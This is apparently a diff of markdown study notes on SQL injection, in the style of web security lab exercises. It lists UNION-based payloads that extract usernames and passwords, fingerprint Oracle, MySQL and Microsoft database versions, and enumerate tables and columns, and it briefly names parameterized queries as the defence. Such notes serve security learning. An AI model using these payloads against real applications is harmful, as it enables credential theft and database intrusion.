@@ -19,7 +19,9 @@
 ### UNION attacks, where you can retrieve data from different database tables 
 `SELECT name, description FROM products WHERE category = 'Gifts'` `' UNION SELECT username, password FROM users--` 
 This will cause the application to return all usernames and passwords along with the names and descriptions of products. Examining the database, where you can extract information about the version and structure of the database 
+
 `SELECT * FROM information_schema.tables` -- what DB table exist 
+
 `SELECT * FROM v$version` -- Oracle version 
 ### Blind SQL injection, where the results of a query you control are not returned in the applications' responses 
 ## How to detect SQLi Vuln? 
@@ -34,9 +36,11 @@ Mostly by using parameterized queries (prepared statements) instead of string co
 `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` 
 ###### SQL injection attack, querying the database type and version on Oracle 
 `'+UNION+SELECT+'abc','def'+FROM+dual--`
+
 `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--` 
 ###### SQL injection attack, querying the database type and version on MySQL and Microsoft 
-`'+UNION+SELECT+'abc','def'#` `'+UNION+SELECT+@@version,+NULL#` 
+`'+UNION+SELECT+'abc','def'#` 
+`'+UNION+SELECT+@@version,+NULL#` 
 ###### SQL injection attack, listing the database contents on non-Oracle databases 
 `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--` `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--` 
 ###### SQL injection attack, listing the database contents on Oracle 
